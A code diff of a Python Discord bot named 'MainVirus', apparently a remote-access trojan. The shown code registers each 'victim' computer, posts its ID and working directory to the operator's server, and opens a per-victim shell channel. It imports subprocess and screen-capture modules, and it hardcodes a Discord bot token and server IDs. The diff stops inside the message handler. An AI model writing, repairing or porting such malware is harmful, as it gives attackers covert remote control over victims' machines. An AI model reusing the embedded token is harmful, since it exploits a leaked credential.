@@ -1,16 +1,16 @@
-import lightbulb, hikari, asyncio, os, random, socket, subprocess, \
-    sys, requests, json, pyautogui, datetime  # installs the import we will need for making the bot
+import asyncio, discord, os, random, socket, subprocess, \
+    sys, requests, json, datetime  # installs the import we will need for making the bot
 from parser import Parser
-from requests_toolbelt.multipart.encoder import MultipartEncoder
 from pathlib import Path
 from PIL import ImageGrab
 import base64
 import time
+from discord.ext import commands
 
 
 class MainVirus:  # Making a class to wrap code cause organisation
     def __init__(self):  # initialisation function
-        self.bot = self.make_connection()  # Creates the discord bot
+        self.bot = discord.Client()  # Creates the discord bot
         self.id = self.make_id()  # Contains the id of the victim's computer
         self.channel_id = None  # Contains the channel id (Used to send messages)
         self.cwd = os.getcwd()  # Contains the cwd of the victim
@@ -23,25 +23,16 @@ class MainVirus:  # Making a class to wrap code cause organisation
 
     def run(self):  # runs the program
         self.connectionSetUp()  # Sets up a connection with discord servers
-        self.commands()  # Checks for discord commands and other events
-        self.bot.run()  # Runs the bot (Makes it online)
-
-    def make_connection(self):  # makes a connection to the discord servers
-        try:  # I use a try method cause the person might not have an internet connection when computer booted
-            return lightbulb.BotApp( # Makes the Discord Bot
-                token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",  # Sets the token for the bot
-                default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
-        except:  # what to do if connection fails
-            time.sleep(3)
-            self.make_connection()  # I run the program again if the connection fails
+        #self.commands()  # Checks for discord commands and other events
+        self.bot.run("OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY")  # Runs the bot (Makes it online)
 
     def make_id(self):  # This Function makes a unique id for each victim
         return random.randint(100, 999)
 
     def connectionSetUp(self):  # Gets discord ready for rshell
-        @self.bot.listen(hikari.StartedEvent)  # Listens for a start event
-        async def onStart(event):
-            await self.bot.rest.create_message(  # Sends the alert of connection
+        @self.bot.event  # Listens for a start event
+        async def on_ready(event):
+            await event.send_message(  # Sends the alert of connection
                 985853985577635910,
                 f"{'-' * 20}\n"
                 f"@everyone **CONNECTION MADE :P**\n"
@@ -50,17 +41,12 @@ class MainVirus:  # Making a class to wrap code cause organisation
                 f"**CWD: **||{os.getcwd()}||\n"
                 f"{'-' * 20}\n"
             )
-            await self.bot.rest.create_guild_text_channel(name=str(self.id), guild=985853825166475284)  # Makes the Shell Channel
+            await event.guild.create_text_channel(name=str(self.id), guild=985853825166475284)  # Makes the Shell Channel
 
     def commands(self):
-        @self.bot.command  # Makes the "test" command
-        @lightbulb.command("test", "testing command")
-        @lightbulb.implements(lightbulb.SlashCommand)
-        async def ping(ctx):
-            await ctx.respond("working")  # Sends a message - "working"
 
-        @self.bot.listen(hikari.GuildMessageCreateEvent)  # Check messages for commands
-        async def onMessage(event):
+        @self.bot.event  # Check messages for commands
+        async def on_message(event):
             if event.content == str(self.id):  # Checks for channel initialisation
                 self.channel_id = event.channel_id  # Sets the shell channel to the one selected
             if event.channel_id == self.channel_id and str(event.author) != "rshellbot#7986":  # Checks if the message is in the shell channel and checks if the message wasn't sent by the bot
